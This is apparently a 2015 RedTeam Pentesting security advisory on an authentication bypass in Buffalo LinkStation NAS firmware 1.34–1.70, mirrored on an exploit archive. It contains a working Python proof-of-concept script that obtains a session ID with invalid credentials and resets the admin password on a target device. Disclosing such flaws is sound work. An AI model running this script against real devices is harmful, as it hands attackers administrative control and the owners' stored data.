@@ -1,0 +1,276 @@
+id: 24388
+date: 10/09/2015
+title: Buffalo LinkStation 1.34 / 1.69 / 1.70 Authentication Bypass
+author: RedTeam
+cves: 
+
+Buffalo LinkStation Authentication Bypass
+
+An authentication bypass vulnerability in the web interface of a Buffalo
+LinkStation Duo Network Attached Storage (NAS) device allows
+unauthenticated attackers to gain administrative privileges. This puts
+the confidentiality and integrity of the stored data as well as the
+integrity of the device configuration at high risk.
+
+
+Details
+=======
+
+Product: Buffalo LinkStation Duo (LS-WXL), LS-CHL(v2), LS-XHL,
+         LS-WVL, LS-WSX, LS-VL, LS-QVL, LS-XL
+Affected Versions: 1.34, 1.69, 1.70
+Fixed Version: 1.71
+Vulnerability Type: Authentication Bypass
+Security Risk: high
+Vendor URL: http://www.buffalotech.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-006
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+LinkStation is a brand name of Network Attached Storage (NAS) devices
+manufactured by the Japanese company Buffalo. The stored data can be
+accessed via several protocols such as SMB, FTP, AFP and HTTP. A web
+interface is provided for management purposes.
+
+
+More Details
+============
+
+The web interface can be reached via HTTP in a web browser. On opening
+the web interface the user is first presented a login screen where a
+username and a password must be supplied. On submission, an HTTP POST
+request is performed by the browser:
+
+POST /dynamic.pl HTTP/1.1
+Host: 192.168.1.2
+[...]
+
+bufaction=verifyLogin&user=RedTeam&password=Pentesting
+
+In the request above, the username "RedTeam" and the password
+"Pentesting" were supplied. The chosen credentials are invalid as no
+user with that name exists. The application responds with a JSON-type
+reply:
+
+HTTP/1.0 200 OK
+[...]
+
+{
+  "data": [
+    {
+      "pageMode": 2,
+      "sid": "5e0f9249a6cc5137d051514c47b2bb9b"
+    }
+  ],
+  "errors": [],
+  "success": false
+}
+
+On the contrary, if valid credentials of an administrative account are
+supplied, a reply similar to the following is received:
+
+HTTP/1.0 200 OK
+[...]
+
+{
+  "data": [
+    {
+      "pageMode": 0,
+      "sid": "b9466fbff0c2f277449015d6e110b173"
+    }
+  ],
+  "errors": [],
+  "success": true
+}
+
+It was found that in both cases valid session IDs are generated and only
+the client-side JavaScript web interface restricts their usage. This is
+triggered by the key "success" within the reply. If the field is set to
+"false", an error is reported and the user is asekd to authenticate
+again.  Otherwise, the user is allowed to use the web interface.
+
+Furthermore, the administrative functions are restricted only on the
+client-side as well. The key "pageMode" was found to be one of the three
+integers representing the type of the user account:
+
+0 - administrator
+1 - regular user without administrative privileges
+2 - guest user without any privileges
+
+Thus, an attacker may simply provide invalid credentials while tampering
+the keys "success" and "pageMode" of the reply in transit (for example
+by using a proxy). The attacker may then use the web interface as an
+administrative user from the browser. Alternatively, a valid session ID
+may be requested using invalid credentials and then used directly to
+execute privileged operations by sending the appropriate POST requests.
+This eliminates the need for tampering the returned JSON-data. Such an
+attack is implemented in the Proof of Concept section.
+
+
+Proof of Concept
+================
+
+The following Python script exploits the described vulnerability and
+sets the password of the "admin"-account to an attacker supplied value.
+
+------------------------------------------------------------------------
+#!/usr/bin/python
+
+import argparse
+import requests
+import json
+import sys
+
+parser = argparse.ArgumentParser(description='Buffalo LinkStation ' +
+    'Authentication Bypass PoC')
+parser.add_argument('host', help='Hostname or IP address of target ' +
+    'device', type=str)
+parser.add_argument('-p', '--port', help='Port of target device',
+    type=int, default=443)
+parser.add_argument('password', help='New admin password', type=str)
+args = parser.parse_args()
+
+def get_session_id(url):
+    headers = {'User-Agent': None}
+    payload = {'bufaction': 'verifyLogin', 'user': 'RedTeam',
+        'password': 'Pentesting'}
+    try:
+        sys.stdout.write("Trying to get a session ID... ")
+        sys.stdout.flush()
+        r = requests.post(url, headers=headers, data=payload,
+            verify=False)
+    except:
+        sys.stdout.write("could not connect to target.\n")
+        sys.stdout.flush()
+        return False
+    if r.status_code != 200:
+        sys.stdout.write("bad reply.\n")
+        sys.stdout.flush()
+        return False
+    try:
+        reply = json.loads(r.text)
+        sid = reply['data'][0]['sid']
+    except:
+        sys.stdout.write("error while parsing reply.")
+        sys.stdout.flush()
+        return False
+    #do not check success key of JSON reply here.
+    #it will most likely be false (user/password wrong)!
+    sys.stdout.write("ok.\n")
+    sys.stdout.flush()
+    return sid
+
+def set_admin_password(url, sid, password):
+    headers = {'User-Agent': None}
+    payload = {'bufaction': 'setUserSettingsadmin', 'userName': 'admin',
+        'userId': '52', 'userDesc': 'Built-in account for ' +
+        'administering the system', 'pwd': args.password, 'confPwd':
+        args.password, 'primGroup': 'admin', 'quota_soft': '',
+        'quota_hard': ''}
+    cookies = {'webui_session_RedTeam': '%s_en_0' % sid}
+    try:
+        sys.stdout.write("Trying to set admin password to %s... " %
+            password)
+        sys.stdout.flush()
+        r = requests.post(url, headers=headers, cookies=cookies,
+            data=payload, verify=False)
+    except:
+        sys.stdout.write("could not connect to target.\n")
+        sys.stdout.flush()
+        return False
+    if r.status_code != 200:
+        sys.stdout.write("bad reply.\n")
+        sys.stdout.flush()
+        return False
+    try:
+        reply = json.loads(r.text)
+        success = reply['success']
+    except:
+        sys.stdout.write("error while parsing reply.\n")
+        sys.stdout.flush()
+        return False
+    if success == True:
+        sys.stdout.write("ok.\n")
+        sys.stdout.flush()
+    else:
+        sys.stdout.write("failed.\n")
+        sys.stdout.flush()
+    return success
+
+requests.packages.urllib3.disable_warnings()
+url = "https://%s:%s/dynamic.pl" % (args.host, args.port)
+sid = get_session_id(url)
+if sid == False:
+    sys.exit(-1)
+
+if set_admin_password(url, sid, args.password) == True:
+    sys.stdout.write("\n")
+    sys.stdout.write("Admin password successfully set!\n")
+    sys.stdout.write("URL: https://%s:%s/\n" % (args.host, args.port))
+    sys.stdout.write("New credentials: admin : %s\n" % args.password)
+    sys.exit(0)
+else:
+    sys.exit(-1)
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+If possible, disable access to the web interface, for example via an ACL
+in the responsible ethernet switch.
+
+
+Fix
+===
+
+Users should install firmware version 1.71 or higher to ensure proper
+server-side authentication. In addition, a password should be set for
+the "guest" user account, which is by default present and enabled, but
+does not have a password.
+
+
+Security Risk
+=============
+
+This vulnerability allows an unauthenticated attacker to gain administrative
+privileges on a Buffalo LinkStation. All attached storage devices may then be
+accessed by the attacker. This puts the available data at risk as confidential
+information may be disclosed, valuable information destroyed or manipulated.
+Depending on the firmware of the device, an attacker may also be able execute
+malicious code on the LinkStation either via installing a customized firmware
+image[0] or by exploiting a publicly disclosed remote command injection
+vulnerability[1].
+
+It is therefore estimated that the vulnerability poses a high risk to
+anyone who uses an affected device.
+
+
+Timeline
+========
+
+2015-03-30 Vulnerability identified
+2015-04-09 Customer approved disclosure to vendor
+2015-06-09 Vendor notified
+2015-06-09 Vendor responds: vulnerability is fixed in version 1.70
+2015-06-09 Verified that vulnerability is not fixed in version 1.70
+2015-06-09 Vendor responded: vulnerability is already known and being
+           worked on, release date is not known
+2015-06-09 Vendor provided list of affected devices
+2015-07-10 Vendor queried for update, no response
+2015-08-03 Vendor queried for update (by phone)
+2015-08-04 Vendor responded: advisory has been forwarded to development.
+2015-08-04 Vendor queried for estimated fix
+2015-08-13 Vendor announced fixed version 1.71
+2015-09-04 CVE ID requested
+2015-09-07 RedTeam verified that the vulnerability has been fixed
+2015-10-07 CVE ID not assigned, may be "duplicate finding"
+2015-10-08 Advisory published
+
+#  0day.today [2023-03-23]  #
